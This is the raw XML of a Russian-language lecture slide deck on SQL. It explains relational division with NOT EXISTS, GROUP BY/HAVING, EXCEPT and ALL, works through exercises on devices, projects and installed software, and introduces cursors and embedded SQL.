            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
              <a:effectLst/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1BCA48-AC4D-E4CB-906A-D3004F12EE9A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="622300" y="4477365"/>
            <a:ext cx="789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Product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maker, type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]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DIVIDE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BY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Product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type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]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455BD8D-8FA7-8A52-CC22-643310989773}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2535783" y="529433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Здесь квадратными скобками здесь обозначается операция взятия проекции на соответствующие атрибуты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2282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FA2DA-D04F-2142-FF11-348D6DD2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реализации деления: контрпример </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Not IN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6E6BFC-703A-4C87-0EF0-9B2C234E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76064"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="2000" dirty="0"/>
              <a:t>Контрпример с использованием </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>NOT IN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AC3C16-DC18-0151-2899-499B2A5DE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D0CDF1-E171-E553-5E8F-7BD933EFB3D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1331640" y="2095701"/>
            <a:ext cx="6096000" cy="35086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DISTINCT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Pr1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NOT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EXISTS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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU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NOT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IN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           </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU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            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            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Pr1.maker = Pr2.maker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           </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU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8A3FF-ABBA-5366-3B2E-104F85082077}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="899592" y="5805231"/>
            <a:ext cx="7488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должно существовать такого типа продукции, которого бы не было у искомого производителя. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="116121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CDE8B-DA37-4126-F216-8BB64644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реализации деления: через группировку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F6D356-75D8-B3E6-2405-4DA42EAD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944216"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Мы можем выполнить </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>группировку по производителю </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>и </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" i="1" dirty="0"/>
              <a:t>подсчитать количество уникальных типов</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Затем мы отберем только </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" i="1" dirty="0"/>
              <a:t>тех производителей, у которых это число равно общему числу </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>уникальных типов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22CCBC-2710-3DD4-2307-34B23CCFF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436701-6151-0279-4BDB-EE4633141492}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="3315038"/>
            <a:ext cx="820891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GROUP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BY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HAVING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FF40F4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COUNT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU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DISTINCT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         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40F4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COUNT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DISTINCT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type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Product</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400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1B4FD-55F0-8D27-1F11-4CACBEEFE487}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1721439" y="5373216"/>
            <a:ext cx="7128792" cy="10156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1600" dirty="0"/>
              <a:t>решение с группировкой не подойдет для случая,  </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>когда требуется выполнить деление не на все множество имеющихся типов, </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>а на некоторое их подмножество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2BE53-ADD4-A8B3-9418-A31EA6930D01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1257413" y="4591294"/>
            <a:ext cx="68961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800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endParaRPr lang="ru-RU" sz="4000" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent2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68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CDE8B-DA37-4126-F216-8BB64644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реализации деления: через разность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22CCBC-2710-3DD4-2307-34B23CCFF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93A2ECB8-3F94-E5E3-0818-2A4FE709D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483" y="1268760"/>
            <a:ext cx="2255285" cy="976311"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Вариант 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31B76C-B7CB-8662-E21D-825581E280A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3208983" y="1353988"/>
            <a:ext cx="56166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DISTINCT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Pr1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111111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0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FF40F4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COUNT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*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(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EXCEPT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Pr2.maker = Pr1.maker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as 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 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8078C-FAEE-82EC-1DDA-5077D1F3744B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="2378655"/>
            <a:ext cx="4536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/>
              <a:t>Если взять операцию </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>разности</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" i="1" dirty="0"/>
              <a:t>ВСЕХ имеющихся типов моделей </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>и </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" i="1" dirty="0"/>
              <a:t>типов у конкретного производителя</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>,  то результирующая выборка не должна содержать строк.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="823333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CDE8B-DA37-4126-F216-8BB64644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реализации деления: через разность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22CCBC-2710-3DD4-2307-34B23CCFF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93A2ECB8-3F94-E5E3-0818-2A4FE709D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483" y="1268760"/>
            <a:ext cx="2255285" cy="976311"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>Вариант 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31B76C-B7CB-8662-E21D-825581E280A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3251090" y="1353988"/>
            <a:ext cx="56166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DISTINCT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   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Pr1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111111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0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FF40F4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COUNT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*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(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EXCEPT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Pr2.maker = Pr1.maker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		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as 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 </a:t>
            </a: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8078C-FAEE-82EC-1DDA-5077D1F3744B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="2378655"/>
            <a:ext cx="4536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/>
              <a:t>Если взять операцию </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>разности</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" i="1" dirty="0"/>
              <a:t>ВСЕХ имеющихся типов моделей </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>и </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" i="1" dirty="0"/>
              <a:t>типов у конкретного производителя</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>,  то результирующая выборка не должна содержать строк.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EA4BDA-0634-3DF0-FBEC-4DCFA138DEC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228938" y="3715731"/>
            <a:ext cx="9023581" cy="97631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Вариант 2: </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>истинностное значение предиката ALL есть TRUE, если подзапрос не возвращает строк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42B3B35-E0E0-0C7B-15E1-8048A134BE91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4180132" y="4644123"/>
            <a:ext cx="4345226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DISTINCT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Pr1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ALL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(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EXCEPT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FROM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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="14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Pr2.maker = Pr1.maker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solidFill>
                  <a:srgbClr val="66CC66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	)</a:t>
            </a:r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Стрелка: влево 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C71DBD4-666E-426A-1FB3-A372D52C0DA1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6088344" y="5061958"/>
            <a:ext cx="1944216" cy="299640"/>
          </a:xfrm>
          <a:prstGeom prst="leftArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 27671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влево 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1B487634-929D-DA76-B012-41F7D6977AC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="4783189" y="2360140"/>
            <a:ext cx="829968" cy="299640"/>
          </a:xfrm>
          <a:prstGeom prst="leftArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 27671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F9CC6-5558-B09E-8129-23292DD45020}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411929" y="5552064"/>
            <a:ext cx="40160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остальных случаях он будет содержать типы моделей, отсутствующие у производителя из внешнего запроса, поэтому операция сравнения </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU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(равенство "=") для всех его моделей даст FALSE.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08807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сложных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1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1 - задача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9520" y="2771635"/>
            <a:ext cx="4101271" cy="3825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A7348-E3A4-B000-2DB3-FB69F129C041}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215031" y="1332010"/>
            <a:ext cx="8821465" cy="1439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--_____________________Запрос _________________________________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проектов, в которых используются, по меньшей мере, все программное обеспечение, установленное на устройства с номером 111.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Перефразировка: </a:t>
            </a:r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проектов, для которых не существует ПО устройства с номером 111 которого не существует в этом проекте</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1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706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1 - решение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84167" y="2918423"/>
            <a:ext cx="2741439" cy="2557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A7348-E3A4-B000-2DB3-FB69F129C041}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215031" y="1332010"/>
            <a:ext cx="8821465" cy="1439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--_____________________Запрос _________________________________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проектов, в которых используются, по меньшей мере, все программное обеспечение, установленное на устройства с номером 111.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Перефразировка: </a:t>
            </a:r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проектов, для которых не существует ПО устройства с номером 111 которого не существует в этом проекте</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1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18B64-9F27-84DF-CFEB-BA819F6ED45D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="531735" y="4086366"/>
            <a:ext cx="89446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PN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выбираем проекты для которых не существует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	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   </a:t>
            </a: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программного обеспечения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DN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111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 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устройства</a:t>
            </a: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111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которого не существует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  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 	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этом проекте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893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2 - задача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9520" y="2771635"/>
            <a:ext cx="4101271" cy="3825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A7348-E3A4-B000-2DB3-FB69F129C041}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215031" y="1332010"/>
            <a:ext cx="8821465" cy="1439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--_____________________Запрос _________________________________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все пары номеров устройств (скажем, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="14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Sx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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="14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причем такие, что на оба эти устройства установлено в точности одно и то же программное обеспечение.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Перефразировка: </a:t>
            </a:r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пары номеров устройств, для которых не существует программного обеспечения на одном устройстве без другого или наоборот  </a:t>
            </a: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887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2 - решение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6556" y="4448555"/>
            <a:ext cx="1887932" cy="176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A7348-E3A4-B000-2DB3-FB69F129C041}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215031" y="1332010"/>
            <a:ext cx="8821465" cy="1439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--_____________________Запрос _________________________________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все пары номеров устройств (скажем, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="14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Sx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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="14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причем такие, что на оба эти устройства установлено в точности одно и то же программное обеспечение.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Перефразировка: </a:t>
            </a:r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пары номеров устройств, для которых не существует программного обеспечения на одном устройстве без другого или наоборот  </a:t>
            </a:r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1E62F-B182-6F31-0D44-856718D64168}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="318394" y="3015136"/>
            <a:ext cx="67738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one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one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сопоставление устройств всех со всеми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one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/>
            </a:r>
            <a:b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EXCEPT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вычитание ПО устройства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</a:t>
            </a:r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UNION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объединение разностей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EXCEPT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вычитание ПО устройства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one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endParaRPr lang="ru-RU" sz="12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one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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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875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 – задача и ее интерпретации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5736" y="3037218"/>
            <a:ext cx="3234608" cy="3017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A7348-E3A4-B000-2DB3-FB69F129C041}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215031" y="1332010"/>
            <a:ext cx="88214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Установить номера устройств, на которые установлено одно и то же программное обеспечение для всех проектов. */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C9EDA-8FA4-7AAB-E8CC-52B37794D749}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="187523" y="1984645"/>
            <a:ext cx="85966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-------------интерпретация 1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1. Определить какое ПО есть у всех проектов (например ХХХ)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2. Определить устройства, на которые оно установлено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9B341-DC44-4099-ABA3-776EC9D9578E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228939" y="3388010"/>
            <a:ext cx="521290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-------------интерпретация 2</a:t>
            </a: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То есть, определить номера устройств, на которых установлено </a:t>
            </a:r>
          </a:p>
          <a:p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точности одно и то же программное обеспечение для всех проектов</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="ru-RU" sz="14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Перефразировка: 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устройств, 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для которых не существует проекта,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для которого не существует проекта,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где ПО устройства  есть в проекте 1 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" i="1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 нет в проекте два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или наоборот</a:t>
            </a:r>
          </a:p>
          <a:p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751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 – решение 1 (этап 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6768" y="2424487"/>
            <a:ext cx="277900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9FEE5E-15B2-366B-64D9-BC2236D5D548}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215031" y="1332010"/>
            <a:ext cx="88214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Установить номера устройств, на которые установлено одно и то же программное обеспечение для всех проектов. */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B4E2E-1619-5456-110A-3BA7D53C2FBB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="158375" y="1984645"/>
            <a:ext cx="85966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-------------интерпретация 1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1. Определить какое ПО есть у всех проектов (например ХХХ)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2. Определить устройства, на которые оно установлено </a:t>
            </a:r>
          </a:p>
          <a:p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9D8AB-DC25-5A89-16DF-EB6941241C26}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="3495552"/>
            <a:ext cx="66247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PN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U3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U3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U3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U2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ru-RU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ru-RU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69DEA6-4AF0-A955-28FB-499064186247}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1276015" y="2797301"/>
            <a:ext cx="466413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Установить одно и то же программное обеспечение для всех проектов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034583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 – решение 1 (этап 2)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6768" y="2424487"/>
            <a:ext cx="277900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9FEE5E-15B2-366B-64D9-BC2236D5D548}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="215031" y="1332010"/>
            <a:ext cx="88214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Установить номера устройств, на которые установлено одно и то же программное обеспечение для всех проектов. */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B4E2E-1619-5456-110A-3BA7D53C2FBB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="158375" y="1984645"/>
            <a:ext cx="85966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-------------интерпретация 1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1. Определить какое ПО есть у всех проектов (например ХХХ)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2. Определить устройства, на которые оно установлено </a:t>
            </a:r>
          </a:p>
          <a:p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69DEA6-4AF0-A955-28FB-499064186247}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1276015" y="2797301"/>
            <a:ext cx="4664138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>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>… и устройства, на которые оно установлено</a:t>
            </a:r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AB860-F730-A024-34A5-7ED3DB45F181}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="3475560"/>
            <a:ext cx="69980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DN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PN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InUse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U3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U3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SN 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U3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U2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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ru-RU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ru-RU" sz="18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Стрелка: влево 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F9A9DD0D-4644-F4FD-C160-7F2C67FD5139}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3131840" y="3448220"/>
            <a:ext cx="1224136" cy="361076"/>
          </a:xfrm>
          <a:prstGeom prst="leftArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 33693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775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 – решение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2C517-95CA-733E-6882-B828526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91162" y="1747395"/>
            <a:ext cx="2006589" cy="1871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3AF327-0694-FD93-1C04-A02D6318FC9E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228939" y="1236731"/>
            <a:ext cx="859666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Установить номера устройств, на которые установлено одно и то же программное обеспечение для всех проектов.</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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-------------интерпретация 2</a:t>
            </a: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То есть, определить номера устройств, на которых установлено </a:t>
            </a:r>
          </a:p>
          <a:p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точности одно и то же программное обеспечение для всех проектов</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="ru-RU" sz="14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Перефразировка: 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устройств, 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для которых не существует проекта,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для которого не существует проекта,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где ПО устройства  есть в проекте 1 и нет в проекте два</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" i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или наоборот</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr 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653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7D8DF-7166-1CDB-5ADA-F54AADE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 – решение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5D46-924C-3B87-DAA3-8237D6A2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9A97D-DB50-950D-ECD7-9C8C172EE3B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="179513" y="1412776"/>
            <a:ext cx="8784976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DN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устройств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U      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для которых не существует проекта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PN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U1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для которого не существует проекта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distinct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PN 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U2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exists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где нет ПО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except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которое есть в проекте 1 но нет в 2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union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или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U2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  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except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наоборот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SN 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en-US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		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        	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU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U1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!=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U2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 причем это разные проекты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ru-RU" sz="1200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or</a:t>
            </a:r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FF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PN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InUse1 UP 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UP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DN</a:t>
            </a:r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)&lt;=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  </a:t>
            </a:r>
            <a:b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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU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--обрабатываем ситуацию когда проект только один, то есть не с чем сравнивать</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="12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00DBB-3868-46FB-5CC5-801228846DFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="148453" y="5813981"/>
            <a:ext cx="878497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ru-RU" sz="11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Установить номера устройств, на которые установлено одно и то же программное обеспечение для всех проектов.</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="11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То есть, определить номера устройств, на которых установлено  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="11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точности одно и то же программное обеспечение для всех проектов. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1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Перефразировка: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1100" i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определить номера устройств, для которых не существует проекта, для которого не существует проекта, где ПО устройства  есть в проекте 1 и нет в проекте два или наоборот </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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669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0F9AD-0782-65B9-C276-C0D1BEBF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есть ли циклы? - Курсоры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8FE967-7EBA-144A-598D-B59D54F7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81A7F5B-4ADB-A3FC-2390-11E3E1DDB61E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="516784" y="1340768"/>
            <a:ext cx="8297425" cy="110713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Курсор - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" i="1" dirty="0"/>
              <a:t>получаемый при выполнении запроса результирующий набор и связанный с ним </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>указатель текущей записи</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p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3A02CDD-0EE9-D336-B482-E29BFA1170DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="492230" y="2447899"/>
          <a:ext cx="7966656" cy="198120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86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6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/>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Пример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ru-RU" sz="1600">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Описание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</a:rPr>
                        <a:t>EXEC SQL DECLARE c1 CURSOR FOR </a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1600" b="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	SELECT f1,f2,f3 </a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1600" b="0" dirty="0">
                        <a:effectLst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	FROM tbl1 WHERE f2&gt;100;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600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>создает курсор c1 на базе таблицы tbl1. При объявлении курсора </a:t>
                      </a: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выполнения запроса не происходит. </a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1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</a:rPr>
                        <a:t>EXEC SQL OPEN CURSOR с1</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>;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/>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>инициирует курсор, выполнив определенный в нем оператор SELECT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50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Подходы к выполнению SQL-операторов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подстановка данных в запрос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2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DB765-35B9-01A6-DAFE-7E289E13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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> со стороны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03BE1D-9B90-3FE7-C043-C37E98995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Встраивание в код </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>некоторого языка программирования S</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0">
